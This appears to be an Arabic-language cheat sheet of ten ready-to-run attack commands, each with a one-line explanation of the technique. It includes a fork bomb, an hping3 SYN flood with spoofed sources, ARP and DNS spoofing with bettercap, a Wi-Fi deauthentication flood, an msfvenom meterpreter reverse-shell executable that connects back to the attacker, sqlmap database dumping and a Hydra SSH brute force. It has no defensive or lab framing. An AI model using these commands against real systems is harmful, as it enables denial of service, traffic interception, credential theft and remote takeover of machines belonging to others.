DDoS

1. Fork Bomb (الانهيار)

🔬 التشريح التقني: استهلاك الـ PID Table عبر تضاعف العمليات أسيًا مما يشل نظام التشغيل تماماً.
:(){ :|:& };:
Network

2. SYN Flood (Hping3)

🔬 التشريح التقني: إرسال سيل من حزم SYN بعناوين IP وهمية لتعطيل استجابة السيرفر للطلبات الحقيقية.
sudo hping3 -S --flood --rand-source -p 80 [Target_IP]
MITM

3. ARP Poisoning (Bettercap)

🔬 التشريح التقني: التلاعب بجدول الـ ARP لتوجيه حركة المرور عبر جهازك للتجسس على البيانات.
bettercap -eval "set arp.spoof.targets [IP]; arp.spoof on; net.sniff on"
Wifi

4. Deauth Attack (Aireplay)

🔬 التشريح التقني: إرسال حزم قطع اتصال لإخراج المستخدمين من الشبكة قسراً.
aireplay-ng --deauth 0 -a [BSSID] wlan0mon
Payload

5. Reverse Shell (Msfvenom)

🔬 التشريح التقني: برمجة ملف تنفيذي يفتح منفذ اتصال خلفي من الضحية إلى المهاجم لتجاوز جدران الحماية.
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=[IP] LPORT=4444 -f exe > shell.exe
Web

6. SQL Map (Auto Injection)

🔬 التشريح التقني: أداة آلية لاستغلال ثغرات حقن SQL وسحب قواعد البيانات بالكامل.
sqlmap -u "http://target.com/id=1" --dbs --batch
Sniffing

7. DNS Spoofing

🔬 التشريح التقني: تزوير استجابات DNS لتحويل الضحية إلى خادم مزيف يملكه المهاجم.
set dns.spoof.domains target.com; set dns.spoof.address [Your_IP]; dns.spoof on
Brute Force

8. Hydra (SSH Crack)

🔬 التشريح التقني: تنفيذ هجوم التخمين السريع على بروتوكولات تسجيل الدخول المشفرة.
hydra -l admin -P passlist.txt ssh://[Target_IP]
Exploit

9. Searchsploit (Local DB)

🔬 التشريح التقني: واجهة سطر أوامر للبحث في قاعدة بيانات Exploit-DB عن ثغرات مطابقة للهدف.
searchsploit "Apache 2.4.49"
System

10. Chroot (Jailbreak)

🔬 التشريح التقني: عزل العمليات في بيئة وهمية أو كسر العزل للوصول لملفات النظام الأساسية.
sudo chroot /mnt/target /bin/bash
